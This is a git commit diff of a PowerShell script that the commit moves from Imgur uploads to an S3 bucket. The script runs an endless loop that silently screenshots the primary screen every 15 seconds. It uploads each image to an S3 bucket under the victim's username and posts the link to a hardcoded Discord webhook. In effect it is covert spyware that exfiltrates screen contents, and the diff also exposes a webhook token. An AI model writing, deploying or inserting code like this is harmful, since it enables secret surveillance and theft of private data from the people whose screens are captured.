c92f1912d951aa9fbdab266d4d89ffda316de32a
Sayuru99 <saurudealwis@ymail.com>
2024-06-03 22:49:12 +0530

    removed imgur and used s3 bucket.

--- resources/ss.ps1
+++ resources/ss.ps1
@@ -1,108 +1,75 @@
-function Capture-Screenshot {
+if (-not (Get-InstalledModule -Name AWS.Tools.Common -ErrorAction SilentlyContinue)) {
+    Install-Module -Name AWS.Tools.Installer -Force
+    Install-AWSToolsModule -Name AWS.Tools.Common,AWS.Tools.S3 -CleanUp -Force
+}
+
+Import-Module -Name AWS.Tools.Common
+Import-Module -Name AWS.Tools.S3
+
+function fnCapture {
     param (
         [string]$OutputFilePath
     )
 
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-    try {
-        $screens = [System.Windows.Forms.Screen]::AllScreens
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $bounds.Width, $bounds.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
 
-        $top    = ($screens | ForEach-Object { $_.Bounds.Top }    | Measure-Object -Minimum).Minimum
-        $left   = ($screens | ForEach-Object { $_.Bounds.Left }   | Measure-Object -Minimum).Minimum
-        $width  = ($screens | ForEach-Object { $_.Bounds.Right }  | Measure-Object -Maximum).Maximum
-        $height = ($screens | ForEach-Object { $_.Bounds.Bottom } | Measure-Object -Maximum).Maximum
+    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
 
-        $bounds   = [System.Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.Width), ([int]$bounds.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-
-        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-
-        $bmp.Save($OutputFilePath)
-        Write-Host "Screenshot captured and saved at: $OutputFilePath"
-    }
-    catch {
-        Write-Host "Error occurred while capturing screenshot: $_"
-    }
-    finally {
-        if ($graphics) { $graphics.Dispose() }
-        if ($bmp) { $bmp.Dispose() }
-    }
+    $bmp.Save($OutputFilePath)
+    $graphics.Dispose()
+    $bmp.Dispose()
 }
 
-function Upload-ToImgur {
+function fnUpload {
     param (
         [string]$ImageFilePath,
-        [string]$ClientId
+        [string]$BucketName
     )
 
-    try {
-        $base64Image = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($ImageFilePath))
-        $headers = @{
-            Authorization = "Client-ID $ClientId"
-        }
-        $body = @{
-            image = $base64Image
-        }
-
-        $response = Invoke-RestMethod -Uri "https://api.imgur.com/3/image" -Method Post -Headers $headers -Body $body
-        $imageUrl = $response.data.link
-        return $imageUrl
-    }
-    catch {
-        Write-Host "Error occurred while uploading image to Imgur: $_"
-        return $null
-    }
+    $AWSRegion = "ca-central-1"
+    $UserName = $env:UserName
+    $Key = "$UserName/" + [guid]::NewGuid().ToString() + ".png"
+        
+    Write-S3Object -BucketName $BucketName -File $ImageFilePath -Key $Key -Region $AWSRegion
+        
+    $ImageUrl = "https://$BucketName.s3.$AWSRegion.amazonaws.com/$Key"
+    return $ImageUrl
 }
 
-function Send-DiscordMessage {
+function fnSendMessage {
     param (
         [string]$WebhookUrl,
+        [string]$UserName,
         [string]$ImageUrl
     )
 
-    try {
-        $payload = @{
-            content = "Screenshot"
-            embeds = @(
-                @{
-                    title = "Screenshot"
-                    image = @{
-                        url = $ImageUrl
-                    }
-                }
-            )
-        }
+    $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $Message = "U $UserName` $DateTime` $ImageUrl"
 
-        $body = $payload | ConvertTo-Json -Depth 5  
-
-        $headers = @{
-            'Content-Type' = 'application/json'
-        }
-
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
+    $payload = @{
+        content = $Message
     }
-    catch {
-        Write-Host "Error occurred while sending Discord message: $_"
+
+    $body = $payload | ConvertTo-Json -Depth 5  
+
+    $headers = @{
+        'Content-Type' = 'application/json'
     }
+
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
 }
 
 $discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
-$imgurClientId = "ffd17df3bb7faec"
+$awsS3BucketName = "strxt-1"
 
 while ($true) {
     $outputFilePath = "$env:temp\$env:computername-Capture.png"
-    Capture-Screenshot -OutputFilePath $outputFilePath
-    
-    $imageUrl = Upload-ToImgur -ImageFilePath $outputFilePath -ClientId $imgurClientId
-    if ($imageUrl) {
-        Write-Host "Image uploaded to Imgur: $imageUrl"
-        Send-DiscordMessage -WebhookUrl $discordWebhookUrl -ImageUrl $imageUrl
-    }
-    else {
-        Write-Host "Failed to upload image to Imgur."
-    }
-    
+    fnCapture -OutputFilePath $outputFilePath
+    $imageUrl = fnUpload -ImageFilePath $outputFilePath -BucketName $awsS3BucketName
+    fnSendMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
     Start-Sleep -Seconds 15
 }
